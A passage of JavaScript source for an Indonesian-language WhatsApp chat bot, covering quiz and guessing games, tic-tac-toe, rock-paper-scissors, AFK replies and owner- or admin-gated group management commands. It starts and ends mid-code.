                await hisoka.sendButtonText(m.chat, [{ buttonId: 'tebak lagu', buttonText: { displayText: 'Tebak Lagu' }, type: 1 }], `🎮 Tebak Lagu 🎮\n\nJawaban Benar 🎉\n\nIngin bermain lagi? tekan button dibawah`, hisoka.user.name, m)
                delete tebaklagu[m.sender.split('@')[0]]
            } else m.reply('*Jawaban Salah!*')
        }

        if (kuismath.hasOwnProperty(m.sender.split('@')[0]) && isCmd) {
            kuis = true
            jawaban = kuismath[m.sender.split('@')[0]]
            if (budy.toLowerCase() == jawaban) {
                await m.reply(`🎮 Kuis Matematika  🎮\n\nJawaban Benar 🎉\n\nIngin bermain lagi? kirim ${prefix}math mode`)
                delete kuismath[m.sender.split('@')[0]]
            } else m.reply('*Jawaban Salah!*')
        }

        if (tebakgambar.hasOwnProperty(m.sender.split('@')[0]) && isCmd) {
            kuis = true
            jawaban = tebakgambar[m.sender.split('@')[0]]
            if (budy.toLowerCase() == jawaban) {
                await hisoka.sendButtonText(m.chat, [{ buttonId: 'tebak gambar', buttonText: { displayText: 'Tebak Gambar' }, type: 1 }], `🎮 Tebak Gambar 🎮\n\nJawaban Benar 🎉\n\nIngin bermain lagi? tekan button dibawah`, hisoka.user.name, m)
                delete tebakgambar[m.sender.split('@')[0]]
            } else m.reply('*Jawaban Salah!*')
        }

        if (tebakkata.hasOwnProperty(m.sender.split('@')[0]) && isCmd) {
            kuis = true
            jawaban = tebakkata[m.sender.split('@')[0]]
            if (budy.toLowerCase() == jawaban) {
                await hisoka.sendButtonText(m.chat, [{ buttonId: 'tebak kata', buttonText: { displayText: 'Tebak Kata' }, type: 1 }], `🎮 Tebak Kata 🎮\n\nJawaban Benar 🎉\n\nIngin bermain lagi? tekan button dibawah`, hisoka.user.name, m)
                delete tebakkata[m.sender.split('@')[0]]
            } else m.reply('*Jawaban Salah!*')
        }

        if (caklontong.hasOwnProperty(m.sender.split('@')[0]) && isCmd) {
            kuis = true
            jawaban = caklontong[m.sender.split('@')[0]]
	    deskripsi = caklontong_desk[m.sender.split('@')[0]]
            if (budy.toLowerCase() == jawaban) {
                await hisoka.sendButtonText(m.chat, [{ buttonId: 'tebak lontong', buttonText: { displayText: 'Tebak Lontong' }, type: 1 }], `🎮 Cak Lontong 🎮\n\nJawaban Benar 🎉\n*${deskripsi}*\n\nIngin bermain lagi? tekan button dibawah`, hisoka.user.name, m)
                delete caklontong[m.sender.split('@')[0]]
		delete caklontong_desk[m.sender.split('@')[0]]
            } else m.reply('*Jawaban Salah!*')
        }

        if (tebakkalimat.hasOwnProperty(m.sender.split('@')[0]) && isCmd) {
            kuis = true
            jawaban = tebakkalimat[m.sender.split('@')[0]]
            if (budy.toLowerCase() == jawaban) {
                await hisoka.sendButtonText(m.chat, [{ buttonId: 'tebak kalimat', buttonText: { displayText: 'Tebak Kalimat' }, type: 1 }], `🎮 Tebak Kalimat 🎮\n\nJawaban Benar 🎉\n\nIngin bermain lagi? tekan button dibawah`, hisoka.user.name, m)
                delete tebakkalimat[m.sender.split('@')[0]]
            } else m.reply('*Jawaban Salah!*')
        }

        if (tebaklirik.hasOwnProperty(m.sender.split('@')[0]) && isCmd) {
            kuis = true
            jawaban = tebaklirik[m.sender.split('@')[0]]
            if (budy.toLowerCase() == jawaban) {
                await hisoka.sendButtonText(m.chat, [{ buttonId: 'tebak lirik', buttonText: { displayText: 'Tebak Lirik' }, type: 1 }], `🎮 Tebak Lirik 🎮\n\nJawaban Benar 🎉\n\nIngin bermain lagi? tekan button dibawah`, hisoka.user.name, m)
                delete tebaklirik[m.sender.split('@')[0]]
            } else m.reply('*Jawaban Salah!*')
        }
	    
	if (tebaktebakan.hasOwnProperty(m.sender.split('@')[0]) && isCmd) {
            kuis = true
            jawaban = tebaktebakan[m.sender.split('@')[0]]
            if (budy.toLowerCase() == jawaban) {
                await hisoka.sendButtonText(m.chat, [{ buttonId: 'tebak tebakan', buttonText: { displayText: 'Tebak Tebakan' }, type: 1 }], `🎮 Tebak Tebakan 🎮\n\nJawaban Benar 🎉\n\nIngin bermain lagi? tekan button dibawah`, hisoka.user.name, m)
                delete tebaktebakan[m.sender.split('@')[0]]
            } else m.reply('*Jawaban Salah!*')
        }
        
        //TicTacToe
	    this.game = this.game ? this.game : {}
	    let room = Object.values(this.game).find(room => room.id && room.game && room.state && room.id.startsWith('tictactoe') && [room.game.playerX, room.game.playerO].includes(m.sender) && room.state == 'PLAYING')
	    if (room) {
	    let ok
	    let isWin = !1
	    let isTie = !1
	    let isSurrender = !1
	    // m.reply(`[DEBUG]\n${parseInt(m.text)}`)
	    if (!/^([1-9]|(me)?nyerah|surr?ender|off|skip)$/i.test(m.text)) return
	    isSurrender = !/^[1-9]$/.test(m.text)
	    if (m.sender !== room.game.currentTurn) { // nek wayahku
	    if (!isSurrender) return !0
	    }
	    if (!isSurrender && 1 > (ok = room.game.turn(m.sender === room.game.playerO, parseInt(m.text) - 1))) {
	    m.reply({
	    '-3': 'Game telah berakhir',
	    '-2': 'Invalid',
	    '-1': 'Posisi Invalid',
	    0: 'Posisi Invalid',
	    }[ok])
	    return !0
	    }
	    if (m.sender === room.game.winner) isWin = true
	    else if (room.game.board === 511) isTie = true
	    let arr = room.game.render().map(v => {
	    return {
	    X: '❌',
	    O: '⭕',
	    1: '1️⃣',
	    2: '2️⃣',
	    3: '3️⃣',
	    4: '4️⃣',
	    5: '5️⃣',
	    6: '6️⃣',
	    7: '7️⃣',
	    8: '8️⃣',
	    9: '9️⃣',
	    }[v]
	    })
	    if (isSurrender) {
	    room.game._currentTurn = m.sender === room.game.playerX
	    isWin = true
	    }
	    let winner = isSurrender ? room.game.currentTurn : room.game.winner
	    let str = `Room ID: ${room.id}

${arr.slice(0, 3).join('')}
${arr.slice(3, 6).join('')}
${arr.slice(6).join('')}

${isWin ? `@${winner.split('@')[0]} Menang!` : isTie ? `Game berakhir` : `Giliran ${['❌', '⭕'][1 * room.game._currentTurn]} (@${room.game.currentTurn.split('@')[0]})`}
❌: @${room.game.playerX.split('@')[0]}
⭕: @${room.game.playerO.split('@')[0]}

Ketik *nyerah* untuk menyerah dan mengakui kekalahan`
	    if ((room.game._currentTurn ^ isSurrender ? room.x : room.o) !== m.chat)
	    room[room.game._currentTurn ^ isSurrender ? 'x' : 'o'] = m.chat
	    if (room.x !== room.o) await hisoka.sendText(room.x, str, m, { mentions: parseMention(str) } )
	    await hisoka.sendText(room.o, str, m, { mentions: parseMention(str) } )
	    if (isTie || isWin) {
	    delete this.game[room.id]
	    }
	    }

        //Suit PvP
	    this.suit = this.suit ? this.suit : {}
	    let roof = Object.values(this.suit).find(roof => roof.id && roof.status && [roof.p, roof.p2].includes(m.sender))
	    if (roof) {
	    let win = ''
	    let tie = false
	    if (m.sender == roof.p2 && /^(acc(ept)?|terima|gas|oke?|tolak|gamau|nanti|ga(k.)?bisa|y)/i.test(m.text) && m.isGroup && roof.status == 'wait') {
	    if (/^(tolak|gamau|nanti|n|ga(k.)?bisa)/i.test(m.text)) {
	    hisoka.sendTextWithMentions(m.chat, `@${roof.p2.split`@`[0]} menolak suit, suit dibatalkan`, m)
	    delete this.suit[roof.id]
	    return !0
	    }
	    roof.status = 'play'
	    roof.asal = m.chat
	    clearTimeout(roof.waktu)
	    //delete roof[roof.id].waktu
	    hisoka.sendText(m.chat, `Suit telah dikirimkan ke chat

@${roof.p.split`@`[0]} dan 
@${roof.p2.split`@`[0]}

Silahkan pilih suit di chat masing"
klik https://wa.me/${botNumber.split`@`[0]}`, m, { mentions: [roof.p, roof.p2] })
	    if (!roof.pilih) hisoka.sendText(roof.p, `Silahkan pilih \n\nBatu🗿\nKertas📄\nGunting✂️`, m)
	    if (!roof.pilih2) hisoka.sendText(roof.p2, `Silahkan pilih \n\nBatu🗿\nKertas📄\nGunting✂️`, m)
	    roof.waktu_milih = setTimeout(() => {
	    if (!roof.pilih && !roof.pilih2) hisoka.sendText(m.chat, `Kedua pemain tidak niat main,\nSuit dibatalkan`)
	    else if (!roof.pilih || !roof.pilih2) {
	    win = !roof.pilih ? roof.p2 : roof.p
	    hisoka.sendTextWithMentions(m.chat, `@${(roof.pilih ? roof.p2 : roof.p).split`@`[0]} tidak memilih suit, game berakhir`, m)
	    }
	    delete this.suit[roof.id]
	    return !0
	    }, roof.timeout)
	    }
	    let jwb = m.sender == roof.p
	    let jwb2 = m.sender == roof.p2
	    let g = /gunting/i
	    let b = /batu/i
	    let k = /kertas/i
	    let reg = /^(gunting|batu|kertas)/i
	    if (jwb && reg.test(m.text) && !roof.pilih && !m.isGroup) {
	    roof.pilih = reg.exec(m.text.toLowerCase())[0]
	    roof.text = m.text
	    m.reply(`Kamu telah memilih ${m.text} ${!roof.pilih2 ? `\n\nMenunggu lawan memilih` : ''}`)
	    if (!roof.pilih2) hisoka.sendText(roof.p2, '_Lawan sudah memilih_\nSekarang giliran kamu', 0)
	    }
	    if (jwb2 && reg.test(m.text) && !roof.pilih2 && !m.isGroup) {
	    roof.pilih2 = reg.exec(m.text.toLowerCase())[0]
	    roof.text2 = m.text
	    m.reply(`Kamu telah memilih ${m.text} ${!roof.pilih ? `\n\nMenunggu lawan memilih` : ''}`)
	    if (!roof.pilih) hisoka.sendText(roof.p, '_Lawan sudah memilih_\nSekarang giliran kamu', 0)
	    }
	    let stage = roof.pilih
	    let stage2 = roof.pilih2
	    if (roof.pilih && roof.pilih2) {
	    clearTimeout(roof.waktu_milih)
	    if (b.test(stage) && g.test(stage2)) win = roof.p
	    else if (b.test(stage) && k.test(stage2)) win = roof.p2
	    else if (g.test(stage) && k.test(stage2)) win = roof.p
	    else if (g.test(stage) && b.test(stage2)) win = roof.p2
	    else if (k.test(stage) && b.test(stage2)) win = roof.p
	    else if (k.test(stage) && g.test(stage2)) win = roof.p2
	    else if (stage == stage2) tie = true
	    hisoka.sendText(roof.asal, `_*Hasil Suit*_${tie ? '\nSERI' : ''}

@${roof.p.split`@`[0]} (${roof.text}) ${tie ? '' : roof.p == win ? ` Menang \n` : ` Kalah \n`}
@${roof.p2.split`@`[0]} (${roof.text2}) ${tie ? '' : roof.p2 == win ? ` Menang \n` : ` Kalah \n`}
`.trim(), m, { mentions: [roof.p, roof.p2] })
	    delete this.suit[roof.id]
	    }
	    }
	    
	    let mentionUser = [...new Set([...(m.mentionedJid || []), ...(m.quoted ? [m.quoted.sender] : [])])]
	    for (let jid of mentionUser) {
            let user = global.db.data.users[jid]
            if (!user) continue
            let afkTime = user.afkTime
            if (!afkTime || afkTime < 0) continue
            let reason = user.afkReason || ''
            m.reply(`
Jangan tag dia!
Dia sedang AFK ${reason ? 'dengan alasan ' + reason : 'tanpa alasan'}
Selama ${clockString(new Date - afkTime)}
`.trim())
        }

        if (db.data.users[m.sender].afkTime > -1) {
            let user = global.db.data.users[m.sender]
            hisoka.sendTextWithMentions(m.chat, `@${m.sender.split('@')[0]} berhenti AFK${user.afkReason ? ' setelah ' + user.afkReason : ''}
Selama ${clockString(new Date - user.afkTime)}`)
            user.afkTime = -1
            user.afkReason = ''
        }
                
      if (!m.sender.startsWith('62') && isCmd) throw 'indonesian only number for use bot\n or buy premium to use bot\nChat wa.me/6282146092695 to buy'    
	    	    
        switch(command) {
	    case prefix+'afk': {
                let user = global.db.data.users[m.sender]
                user.afkTime = + new Date
                user.afkReason = text
                m.reply(`${m.pushName} Telah Afk${text ? ': ' + text : ''}`)
            }
            break	
        case prefix+'zippshare': case prefix+'zippydl': case prefix+'zippsharedl': case prefix+'zippy': {
        if (!args[0]) throw 'Uhm...url nya mana?'
        let zsExtract = require('zs-extract')
 let res = await zsExtract.extract(args[0])
 let { download, filename } = res
 m.reply(JSON.stringify(res, null, 2))
 hisoka.sendFileUrl(m.chat, download, filename, m)
}
break
        case prefix+'ttc': case prefix+'ttt': case prefix+'tictactoe': {
            let TicTacToe = require("./lib/tictactoe")
            this.game = this.game ? this.game : {}
            if (Object.values(this.game).find(room => room.id.startsWith('tictactoe') && [room.game.playerX, room.game.playerO].includes(m.sender))) throw 'Kamu masih didalam game'
            let room = Object.values(this.game).find(room => room.state === 'WAITING' && (text ? room.name === text : true))
            if (room) {
            m.reply('Partner ditemukan!')
            room.o = m.chat
            room.game.playerO = m.sender
            room.state = 'PLAYING'
            let arr = room.game.render().map(v => {
            return {
            X: '❌',
            O: '⭕',
            1: '1️⃣',
            2: '2️⃣',
            3: '3️⃣',
            4: '4️⃣',
            5: '5️⃣',
            6: '6️⃣',
            7: '7️⃣',
            8: '8️⃣',
            9: '9️⃣',
            }[v]
            })
            let str = `Room ID: ${room.id}

${arr.slice(0, 3).join('')}
${arr.slice(3, 6).join('')}
${arr.slice(6).join('')}

Menunggu @${room.game.currentTurn.split('@')[0]}

Ketik *nyerah* untuk menyerah dan mengakui kekalahan`
            if (room.x !== room.o) await hisoka.sendText(room.x, str, m, { mentions: parseMention(str) } )
            await hisoka.sendText(room.o, str, m, { mentions: parseMention(str) } )
            } else {
            room = {
            id: 'tictactoe-' + (+new Date),
            x: m.chat,
            o: '',
            game: new TicTacToe(m.sender, 'o'),
            state: 'WAITING'
            }
            if (text) room.name = text
            m.reply('Menunggu partner' + (text ? ` mengetik command dibawah ini ${prefix}${command} ${text}` : ''))
            this.game[room.id] = room
            }
            }
            break
            case prefix+'delttc': case prefix+'delttt': {
            let roomnya = Object.values(this.game).find(room => room.id.startsWith('tictactoe') && [room.game.playerX, room.game.playerO].includes(m.sender))
            if (!roomnya) throw `Kamu sedang tidak berada di room tictactoe !`
            delete this.game[roomnya.id]
            m.reply(`Berhasil delete session room tictactoe !`)
            }
            break
            case prefix+'suitpvp': case prefix+'suit': {
            this.suit = this.suit ? this.suit : {}
            let poin = 10
            let poin_lose = 10
            let timeout = 60000
            if (Object.values(this.suit).find(roof => roof.id.startsWith('suit') && [roof.p, roof.p2].includes(m.sender))) m.reply(`Selesaikan suit mu yang sebelumnya`)
	    if (m.mentionedJid[0] === m.sender) return m.reply(`Tidak bisa bermain dengan diri sendiri !`)
            if (!m.mentionedJid[0]) return m.reply(`_Siapa yang ingin kamu tantang?_\nTag orangnya..\n\nContoh : ${prefix}suit @${owner[1]}`, m.chat, { mentions: [owner[1] + '@s.whatsapp.net'] })
            if (Object.values(this.suit).find(roof => roof.id.startsWith('suit') && [roof.p, roof.p2].includes(m.mentionedJid[0]))) throw `Orang yang kamu tantang sedang bermain suit bersama orang lain :(`
            let id = 'suit_' + new Date() * 1
            let caption = `_*SUIT PvP*_

@${m.sender.split`@`[0]} menantang @${m.mentionedJid[0].split`@`[0]} untuk bermain suit

Silahkan @${m.mentionedJid[0].split`@`[0]} untuk ketik terima/tolak`
            this.suit[id] = {
            chat: await hisoka.sendText(m.chat, caption, m, { mentions: parseMention(caption) }),
            id: id,
            p: m.sender,
            p2: m.mentionedJid[0],
            status: 'wait',
            waktu: setTimeout(() => {
            if (this.suit[id]) hisoka.sendText(m.chat, `_Waktu suit habis_`, m)
            delete this.suit[id]
            }, 60000), poin, poin_lose, timeout
            }
            }
            break
	    case prefix+'donasi': case prefix+'sewabot': case prefix+'sewa': case prefix+'buypremium': case prefix+'donate': {
	        hisoka.sendText(m.chat, `Karena Masih Sepi User Dan Juga Bot Masih Baru Jadi Free Aja\nDonate To support Me!\nPulsa, dana, gopay : 6282146092695`, m)
            }
            break
            case prefix+'sc': {
hisoka.relayMessage(m.chat, { requestPaymentMessage: {
  noteMessage: { extendedTextMessage: { text: `Mau sc ? donate seikhlas nya donh om\nChat: wa.me/6282146092695` }},
  currencyCodeIso4217: 'USD',
  currencyCode: 'Mau Apa Bang Di Eval? Cie Anda Kang Copas Yahh Awokawok Tolol Luhh :v',
  requestFrom: '0@s.whatsapp.net',
  expiryTimestamp: 300000,
    amount1000: 10000000,
    amount: 1500000,

}}, {})            }
            break
            case prefix+'chat': {
                if (!isCreator) throw mess.owner
                if (!q) throw 'Option : 1. mute\n2. unmute\n3. archive\n4. unarchive\n5. read\n6. unread\n7. delete'
                if (args[0] === 'mute') {
                    hisoka.chatModify({ mute: 'Infinity' }, m.chat, []).then((res) => m.reply(jsonformat(res))).catch((err) => m.reply(jsonformat(err)))
                } else if (args[0] === 'unmute') {
                    hisoka.chatModify({ mute: null }, m.chat, []).then((res) => m.reply(jsonformat(res))).catch((err) => m.reply(jsonformat(err)))
                } else if (args[0] === 'archive') {
                    hisoka.chatModify({  archive: true }, m.chat, []).then((res) => m.reply(jsonformat(res))).catch((err) => m.reply(jsonformat(err)))
                } else if (args[0] === 'unarchive') {
                    hisoka.chatModify({ archive: false }, m.chat, []).then((res) => m.reply(jsonformat(res))).catch((err) => m.reply(jsonformat(err)))
                } else if (args[0] === 'read') {
                    hisoka.chatModify({ markRead: true }, m.chat, []).then((res) => m.reply(jsonformat(res))).catch((err) => m.reply(jsonformat(err)))
                } else if (args[0] === 'unread') {
                    hisoka.chatModify({ markRead: false }, m.chat, []).then((res) => m.reply(jsonformat(res))).catch((err) => m.reply(jsonformat(err)))
                } else if (args[0] === 'delete') {
                    hisoka.chatModify({ clear: { message: { id: m.quoted.id, fromMe: true }} }, m.chat, []).then((res) => m.reply(jsonformat(res))).catch((err) => m.reply(jsonformat(err)))
                }
            }
            break
	    case prefix+'family100': {
                if ('family100'+m.chat in _family100) {
                    m.reply('Masih Ada Sesi Yang Belum Diselesaikan!')
                    throw false
                }
                let anu = await fetchJson('https://raw.githubusercontent.com/BochilTeam/database/master/games/family100.json')
                let random = anu[Math.floor(Math.random() * anu.length)]
                let hasil = `*Jawablah Pertanyaan Berikut :*\n${random.soal}\n\nTerdapat *${random.jawaban.length}* Jawaban ${random.jawaban.find(v => v.includes(' ')) ? `(beberapa Jawaban Terdapat Spasi)` : ''}`.trim()
                _family100['family100'+m.chat] = {
                    id: 'family100'+m.chat,
                    pesan: await hisoka.sendText(m.chat, hasil, m),
                    ...random,
                    terjawab: Array.from(random.jawaban, () => false),
                    hadiah: 6,
                }
            }
            break
            case prefix+'halah': case prefix+'hilih': case prefix+'huluh': case prefix+'heleh': case prefix+'holoh':
            if (!m.quoted && !text) throw `Kirim/reply text dengan caption ${prefix + command}`
            ter = command[1].toLowerCase()
            tex = m.quoted ? m.quoted.text ? m.quoted.text : q ? q : m.text : q ? q : m.text
            m.reply(tex.replace(/[aiueo]/g, ter).replace(/[AIUEO]/g, ter.toUpperCase()))
            break
            case prefix+'tebak': {
                if (!text) throw `Example : ${prefix + command} lagu\n\nOption : \n1. lagu\n2. gambar\n3. kata\n4. kalimat\n5. lirik\n6.lontong`
                if (args[0] === "lagu") {
                    if (tebaklagu.hasOwnProperty(m.sender.split('@')[0])) throw "Masih Ada Sesi Yang Belum Diselesaikan!"
                    let anu = await fetchJson('https://fatiharridho.github.io/tebaklagu.json')
                    let result = anu[Math.floor(Math.random() * anu.length)]
                    let msg = await hisoka.sendMessage(m.chat, { audio: { url: result.link_song }, mimetype: 'audio/mpeg' }, { quoted: m })
                    hisoka.sendText(m.chat, `Lagu Tersebut Adalah Lagu dari?\n\nArtist : ${result.artist}\nWaktu : 60s`, msg).then(() => {
                    tebaklagu[m.sender.split('@')[0]] = result.jawaban.toLowerCase()
                    })
                    await sleep(60000)
                    if (tebaklagu.hasOwnProperty(m.sender.split('@')[0])) {
                    console.log("Jawaban: " + result.jawaban)
                    hisoka.sendButtonText(m.chat, [{ buttonId: 'tebak lagu', buttonText: { displayText: 'Tebak Lagu' }, type: 1 }], `Waktu Habis\nJawaban:  ${tebaklagu[m.sender.split('@')[0]]}\n\nIngin bermain? tekan button dibawah`, hisoka.user.name, m)
                    delete tebaklagu[m.sender.split('@')[0]]
                    }
                } else if (args[0] === 'gambar') {
                    if (tebakgambar.hasOwnProperty(m.sender.split('@')[0])) throw "Masih Ada Sesi Yang Belum Diselesaikan!"
                    let anu = await fetchJson('https://raw.githubusercontent.com/BochilTeam/database/master/games/tebakgambar.json')
                    let result = anu[Math.floor(Math.random() * anu.length)]
                    hisoka.sendImage(m.chat, result.img, `Silahkan Jawab Soal Di Atas Ini\n\nDeskripsi : ${result.deskripsi}\nWaktu : 60s`, m).then(() => {
                    tebakgambar[m.sender.split('@')[0]] = result.jawaban.toLowerCase()
                    })
                    await sleep(60000)
                    if (tebakgambar.hasOwnProperty(m.sender.split('@')[0])) {
                    console.log("Jawaban: " + result.jawaban)
                    hisoka.sendButtonText(m.chat, [{ buttonId: 'tebak gambar', buttonText: { displayText: 'Tebak Gambar' }, type: 1 }], `Waktu Habis\nJawaban:  ${tebakgambar[m.sender.split('@')[0]]}\n\nIngin bermain? tekan button dibawah`, hisoka.user.name, m)
                    delete tebakgambar[m.sender.split('@')[0]]
                    }
                } else if (args[0] === 'kata') {
                    if (tebakkata.hasOwnProperty(m.sender.split('@')[0])) throw "Masih Ada Sesi Yang Belum Diselesaikan!"
                    let anu = await fetchJson('https://raw.githubusercontent.com/BochilTeam/database/master/games/tebakkata.json')
                    let result = anu[Math.floor(Math.random() * anu.length)]
                    hisoka.sendText(m.chat, `Silahkan Jawab Pertanyaan Berikut\n\n${result.soal}\nWaktu : 60s`, m).then(() => {
                    tebakkata[m.sender.split('@')[0]] = result.jawaban.toLowerCase()
                    })
                    await sleep(60000)
                    if (tebakkata.hasOwnProperty(m.sender.split('@')[0])) {
                    console.log("Jawaban: " + result.jawaban)
                    hisoka.sendButtonText(m.chat, [{ buttonId: 'tebak kata', buttonText: { displayText: 'Tebak Kata' }, type: 1 }], `Waktu Habis\nJawaban:  ${tebakkata[m.sender.split('@')[0]]}\n\nIngin bermain? tekan button dibawah`, hisoka.user.name, m)
                    delete tebakkata[m.sender.split('@')[0]]
                    }
                } else if (args[0] === 'kalimat') {
                    if (tebakkalimat.hasOwnProperty(m.sender.split('@')[0])) throw "Masih Ada Sesi Yang Belum Diselesaikan!"
                    let anu = await fetchJson('https://raw.githubusercontent.com/BochilTeam/database/master/games/tebakkalimat.json')
                    let result = anu[Math.floor(Math.random() * anu.length)]
                    hisoka.sendText(m.chat, `Silahkan Jawab Pertanyaan Berikut\n\n${result.soal}\nWaktu : 60s`, m).then(() => {
                    tebakkalimat[m.sender.split('@')[0]] = result.jawaban.toLowerCase()
                    })
                    await sleep(60000)
                    if (tebakkalimat.hasOwnProperty(m.sender.split('@')[0])) {
                    console.log("Jawaban: " + result.jawaban)
                    hisoka.sendButtonText(m.chat, [{ buttonId: 'tebak kalimat', buttonText: { displayText: 'Tebak Kalimat' }, type: 1 }], `Waktu Habis\nJawaban:  ${tebakkalimat[m.sender.split('@')[0]]}\n\nIngin bermain? tekan button dibawah`, hisoka.user.name, m)
                    delete tebakkalimat[m.sender.split('@')[0]]
                    }
                } else if (args[0] === 'lirik') {
                    if (tebaklirik.hasOwnProperty(m.sender.split('@')[0])) throw "Masih Ada Sesi Yang Belum Diselesaikan!"
                    let anu = await fetchJson('https://raw.githubusercontent.com/BochilTeam/database/master/games/tebaklirik.json')
                    let result = anu[Math.floor(Math.random() * anu.length)]
                    hisoka.sendText(m.chat, `Ini Adalah Lirik Dari Lagu? : *${result.soal}*?\nWaktu : 60s`, m).then(() => {
                    tebaklirik[m.sender.split('@')[0]] = result.jawaban.toLowerCase()
                    })
                    await sleep(60000)
                    if (tebaklirik.hasOwnProperty(m.sender.split('@')[0])) {
                    console.log("Jawaban: " + result.jawaban)
                    hisoka.sendButtonText(m.chat, [{ buttonId: 'tebak lirik', buttonText: { displayText: 'Tebak Lirik' }, type: 1 }], `Waktu Habis\nJawaban:  ${tebaklirik[m.sender.split('@')[0]]}\n\nIngin bermain? tekan button dibawah`, hisoka.user.name, m)
                    delete tebaklirik[m.sender.split('@')[0]]
                    }
                } else if (args[0] === 'lontong') {
                    if (caklontong.hasOwnProperty(m.sender.split('@')[0])) throw "Masih Ada Sesi Yang Belum Diselesaikan!"
                    let anu = await fetchJson('https://raw.githubusercontent.com/BochilTeam/database/master/games/caklontong.json')
                    let result = anu[Math.floor(Math.random() * anu.length)]
                    hisoka.sendText(m.chat, `*Jawablah Pertanyaan Berikut :*\n${result.soal}*\nWaktu : 60s`, m).then(() => {
                    caklontong[m.sender.split('@')[0]] = result.jawaban.toLowerCase()
		    caklontong_desk[m.sender.split('@')[0]] = result.deskripsi
                    })
                    await sleep(60000)
                    if (caklontong.hasOwnProperty(m.sender.split('@')[0])) {
                    console.log("Jawaban: " + result.jawaban)
                    hisoka.sendButtonText(m.chat, [{ buttonId: 'tebak lontong', buttonText: { displayText: 'Tebak Lontong' }, type: 1 }], `Waktu Habis\nJawaban:  ${caklontong[m.sender.split('@')[0]]}\nDeskripsi : ${caklontong_desk[m.sender.split('@')[0]]}\n\nIngin bermain? tekan button dibawah`, hisoka.user.name, m)
                    delete caklontong[m.sender.split('@')[0]]
		    delete caklontong_desk[m.sender.split('@')[0]]
                    }
                }
            }
            break
            case prefix+'kuismath': case prefix+'math': {
                if (kuismath.hasOwnProperty(m.sender.split('@')[0])) throw "Masih Ada Sesi Yang Belum Diselesaikan!"
                let { genMath, modes } = require('./src/math')
                if (!text) throw `Mode: ${Object.keys(modes).join(' | ')}\nContoh penggunaan: ${prefix}math medium`
                let result = await genMath(text.toLowerCase())
                hisoka.sendText(m.chat, `*Berapa hasil dari: ${result.soal.toLowerCase()}*?\n\nWaktu: ${(result.waktu / 1000).toFixed(2)} detik`, m).then(() => {
                    kuismath[m.sender.split('@')[0]] = result.jawaban
                })
                await sleep(result.waktu)
                if (kuismath.hasOwnProperty(m.sender.split('@')[0])) {
                    console.log("Jawaban: " + result.jawaban)
                    m.reply("Waktu Habis\nJawaban: " + kuismath[m.sender.split('@')[0]])
                    delete kuismath[m.sender.split('@')[0]]
                }
            }
            break
            case prefix+'jodohku': {
            if (!m.isGroup) throw mess.group
            let member = participants.map(u => u.id)
            let me = m.sender
            let jodoh = member[Math.floor(Math.random() * member.length)]
            let jawab = `👫Jodoh mu adalah

@${me.split('@')[0]} ❤️ @${jodoh.split('@')[0]}`
            let ments = [me, jodoh]
            let buttons = [
                        { buttonId: 'jodohku', buttonText: { displayText: 'Jodohku' }, type: 1 }
                    ]
                    await hisoka.sendButtonText(m.chat, buttons, jawab, hisoka.user.name, m, {mentions: ments})
            }
            break
            case prefix+'jadian': {
            if (!m.isGroup) throw mess.group
            let member = participants.map(u => u.id)
            let orang = member[Math.floor(Math.random() * member.length)]
            let jodoh = member[Math.floor(Math.random() * member.length)]
            let jawab = `Ciee yang Jadian💖 Jangan lupa pajak jadiannya🐤

@${orang.split('@')[0]} ❤️ @${jodoh.split('@')[0]}`
            let menst = [orang, jodoh]
            let buttons = [
                        { buttonId: 'jadian', buttonText: { displayText: 'Jodohku' }, type: 1 }
                    ]
                    await hisoka.sendButtonText(m.chat, buttons, jawab, hisoka.user.name, m, {mentions: menst})
            }
            break
            case prefix+'react': {
                reactionMessage = {
                    react: {
                        text: args[0],
                        key: { remoteJid: m.chat, fromMe: true, id: quoted.id }
                    }
                }
                hisoka.sendMessage(m.chat, reactionMessage)
            }
            break  
            case prefix+'join': {
                if (!isCreator) throw mess.owner
                if (!text) throw 'Masukkan Link Group!'
                if (!isUrl(args[0]) && !args[0].includes('whatsapp.com')) throw 'Link Invalid!'
                                hisoka.sendMessage(m.chat, waitv2, { quoted: m })

                let result = args[0].split('https://chat.whatsapp.com/')[1]
                await hisoka.groupAcceptInvite(result).then((res) => m.reply(jsonformat(res))).catch((err) => m.reply(jsonformat(err)))
            }
            break
            case prefix+'leave': {
                if (!isCreator) throw mess.owner
                await hisoka.groupLeave(m.chat).then((res) => m.reply(jsonformat(res))).catch((err) => m.reply(jsonformat(err)))
            }
            break
            case prefix+'setexif': {
               if (!isCreator) throw mess.owner
               if (!text) throw `Example : ${prefix + command} packname|author`
          global.packname = text.split("|")[0]
          global.author = text.split("|")[1]
          m.reply(`Exif berhasil diubah menjadi\n\n⭔ Packname : ${global.packname}\n⭔ Author : ${global.author}`)
            }
            break
	case prefix+'kick': {
		if (!m.isGroup) throw mess.group
        if (!isBotAdmins) throw mess.botAdmin
        if (!isAdmins) throw mess.admin
		let users = m.mentionedJid[0] ? m.mentionedJid : m.quoted ? [m.quoted.sender] : [text.replace(/[^0-9]/g, '')+'@s.whatsapp.net']
		await hisoka.groupParticipantsUpdate(m.chat, users, 'remove').then((res) => m.reply(jsonformat(res))).catch((err) => m.reply(jsonformat(err)))
	}
	break
	case prefix+'add': {
		if (!m.isGroup) throw mess.group
        if (!isBotAdmins) throw mess.botAdmin
        if (!isAdmins) throw mess.admin
		let users = m.mentionedJid[0] ? m.mentionedJid : m.quoted ? [m.quoted.sender] : [text.replace(/[^0-9]/g, '')+'@s.whatsapp.net']
		await hisoka.groupParticipantsUpdate(m.chat, users, 'add').then((res) => m.reply(jsonformat(res))).catch((err) => m.reply(jsonformat(err)))
	}
	break
	case prefix+'promote': {
		if (!m.isGroup) throw mess.group
        if (!isBotAdmins) throw mess.botAdmin
        if (!isAdmins) throw mess.admin
		let users = m.mentionedJid[0] ? m.mentionedJid : m.quoted ? [m.quoted.sender] : [text.replace(/[^0-9]/g, '')+'@s.whatsapp.net']
		await hisoka.groupParticipantsUpdate(m.chat, users, 'promote').then((res) => m.reply(jsonformat(res))).catch((err) => m.reply(jsonformat(err)))
	}
	break
	case prefix+'demote': {
		if (!m.isGroup) throw mess.group
        if (!isBotAdmins) throw mess.botAdmin
        if (!isAdmins) throw mess.admin
		let users = m.mentionedJid[0] ? m.mentionedJid : m.quoted ? [m.quoted.sender] : [text.replace(/[^0-9]/g, '')+'@s.whatsapp.net']
		await hisoka.groupParticipantsUpdate(m.chat, users, 'demote').then((res) => m.reply(jsonformat(res))).catch((err) => m.reply(jsonformat(err)))
	}
	break
	    case prefix+'blok': {
	    if (!text) throw `Nomor ?`
